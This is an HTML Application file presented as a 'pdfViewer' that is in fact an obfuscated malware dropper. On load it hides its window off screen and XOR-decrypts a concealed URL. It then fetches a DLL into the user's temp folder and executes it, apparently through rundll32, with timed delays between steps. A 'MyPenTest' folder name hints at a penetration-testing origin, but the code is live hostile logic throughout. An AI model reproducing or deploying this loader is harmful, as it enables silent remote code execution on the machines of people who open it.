<html>
<head>
<title>.</title>
<hta:application
    id="pdfViewer"   
    border="none"    
    caption="no"    
    maximizebutton="no"
    minimizebutton="no"
    showintaskbar="no"
    windowstate="minimize"
/>
<script language="javascript">
function ffg(hex) {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) {
        var hexPair = hex.substring(i, i + 2);
        var charCode = parseInt(hexPair, 16);
        str += String.fromCharCode(charCode);
    }
    return str;
}

function frr(encrypted, kk) {
    var result = '';
    for (var i = 0; i < encrypted.length; i++) {
        var charCode = encrypted.charCodeAt(i);
        var kkCharCode = kk.charCodeAt(i % kk.length);
        var decryptedChar = String.fromCharCode(charCode ^ kkCharCode);
        result += decryptedChar;
    }
    return result;
}

function dtext(etext) {            
    var kk = '3b111702164e77401525084e0907050f274a';            
    try {                
        var cleanHex = etext.replace(/\s+/g, '');             
        var encrypted = ffg(cleanHex);                
        var decrypted = frr(encrypted, kk);
        return decrypted;                
    } catch (e) {}
}

window.onload = function () {
    try {
        window.resizeTo(0, 0);
        window.moveTo(-32000, -32000); 
        var rr = new ActiveXObject("WScript.Shell");
        var shellApp = new ActiveXObject("Shell.Application");
        var fso = new ActiveXObject("Scripting.FileSystemObject");        
        var tempDir = rr.ExpandEnvironmentStrings("%TEMP%");
        var targetDir = tempDir + "\\MyPenTest";
        var dllUrl = dtext("5b164541420d1f1d505e59045344555d545040050308024853565c5b51571e015b435c14514c585e1e5058464819671156435d535d5c506542575e3a065459591e515c0a");
        var dllPath = tempDir + "\\StaticlibProj_6min.dll";

        function sleep(ms) {
            rr.Run("ping 127.0.0.1 -n " + ((ms / 3000) + 1) + " > nul", 0, true);
        }

        if (!fso.FolderExists(targetDir)) {
            fso.CreateFolder(targetDir);
        }

        sleep(15000);

        rr.Run(dtext("5b164541420d1f1d505e59045344555d545040050308024853565c5b51571e015b435c14514c585e1e5058464819671156435d535d5c506542575e3a065459591e515c0a") + 
            " '" + dllUrl + "' -OutFile '" + dllPath + "'", 0, true);

        sleep(15000);

        var ee = dtext("41175f555d5b03001f534c00");
        rr.Run(ee + " \"" + dllPath + "\",StartProc", 0, true);

        setTimeout(function () {
            window.close();
        }, 5000);

    } catch (e) {
        alert("Error: " + e.message);
    }
};
</script>
</head>
<body style="display:none;"></body>
</html>
